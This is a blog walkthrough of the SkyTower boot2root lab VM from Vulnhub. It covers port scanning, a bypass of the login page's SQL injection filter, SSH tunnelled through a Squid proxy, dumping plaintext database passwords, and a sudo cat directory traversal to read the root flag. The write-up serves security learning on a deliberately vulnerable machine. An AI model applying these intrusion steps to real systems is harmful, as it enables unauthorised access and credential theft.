---
author: recrudesce
comments: false
date: 2014-08-05 22:49:01+00:00
layout: post
slug: i-climbed-the-skytower-but-no-rapunzel
title: I Climbed the SkyTower, But No Rapunzel :(
wordpress_id: 170
categories:
- VM's
tags:
- boot2root
- SkyTower
- vulnhub
---

SkyTower is available from [Vulnhub](http://vulnhub.com/entry/skytower-1,96/), and is a quick brain teaser that everyone is encouraged to try. It doesn't take long, so it's fun to see if you can do in your lunchbreak. The walkthrough is going to be short and sweet - maybe with a few GIFs thrown in for good measure.
<!-- more -->


## So What Runneth Upon Thee ?


Obviously NMAP is used to get a quick rundown of what services are available.


``` bash

root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-05 22:59 BST
Nmap scan report for 192.168.0.106
Host is up (0.00s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:  GET
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=8/5%OT=80%CT=1%CU=42026%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=53E153CE%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.00 ms 192.168.0.106

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.35 seconds
root@pwk:~# 
```


Not very exciting - SSH, HTTP and a SQUID proxy. Interestingly SSH is filtered, which means no easy route in :(

[![53193742](http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg)](http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg)

HTTP is our next destination, which shows a nicely branded login page.

[![skytower_001](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png)

SQLi me-thinks.  Lets try some simple things like entering 123' or 1=1 into the email field and clicking Login

[![skytower_002](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png)

[![skytower_003](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png)

Hmm, no dice. Looks like the code is filtering out simple SQLi.  Can we fool this into filtering out the 'or' and the '=' but still have an 'or' clause left over ?  Turns out, yes we can ;)

[![skytower_004](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png)

[![skytower_005](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png)

This requires a GIF...

![](http://31.media.tumblr.com/tumblr_lvgefaA0WX1qhigt0o1_500.gif)



* * *





## Looting the Retirement Fund


We now have SSH login credentials, but you'll remember earlier on that SSH is filtered externally. It is, however, possible to leverage the SQUID proxy to get an SSH session using proxytunnel to bind a local port.


``` bash
root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222
```


A quick netstat shows that our local port is available


``` bash
root@pwk:~# netstat -antp tcp | grep :222
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel: 
```


Let us SSH into it with the provided credentials


``` bash

root@pwk:~# ssh john@127.0.0.1 -p 222
The authenticity of host '[127.0.0.1]:222 ([127.0.0.1]:222)' can't be established.
ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:222' (ECDSA) to the list of known hosts.
john@127.0.0.1's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 127.0.0.1 closed.
root@pwk:~#
```


Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?


``` bash
root@pwk:~# ssh john@127.0.0.1 -p 222 -t "/bin/sh"
john@127.0.0.1's password: hereisjohn
john@SkyTower:~$
```


First things first, that SQLi filter - what did it look like in it's entirety ?

[php]$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);[/php]

Quite simple, but annoying none the less. Thankfully it was easily bypassed.
It's obvious while looking at the /var/www/login.php file that the application uses a MySQL database to handle logins. The MySQL credentials are helpfully in plain text within the file

[php]$db = new mysqli('localhost', 'root', 'root', 'SkyTech');[/php]

Using the mysql client, it is possible to obtain all users passwords, as they are stored unencrypted in the login table within the SkyTech database


``` bash

john@SkyTower:~$ mysql -uroot -proot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 51
Server version: 5.5.35-0+wheezy1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)

mysql>
```


That's handy - William looks like he's revered by the company, as his password is (a typo) of 'sensible'. Unfortunately his credentials do not work


``` bash

john@SkyTower:~$ su william
Password:
su: Authentication failure
john@SkyTower:~$
```


How about Sara ?


``` bash

john@SkyTower:~$ su sara
Password: 

Funds have been withdrawn
john@SkyTower:~$

```


We're hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)


``` bash

root@pwk:~# ssh sara@127.0.0.1 -p 222 -t /bin/sh
sara@127.0.0.1's password: ihatethisjob
$
```


![](http://i.imgur.com/PbksBXu.gif)

Sara has been entrusted with sudo ability, albeit very locked down, but the available commands running as the root user can be used to leverage directory traversal to read files elsewhere on the filesystem. Files such as /root/flag.txt, which provides us with the root password


``` bash

$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
$ 
```


A quick su root drops us to a root shell


``` bash

$ su root
Password: theskytower
root@SkyTower:/home/sara# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:/home/sara# 
```


![](http://38.media.tumblr.com/5e829faafb14759c51d20dae54525c29/tumblr_n964zghd0h1qz581wo2_500.gif)
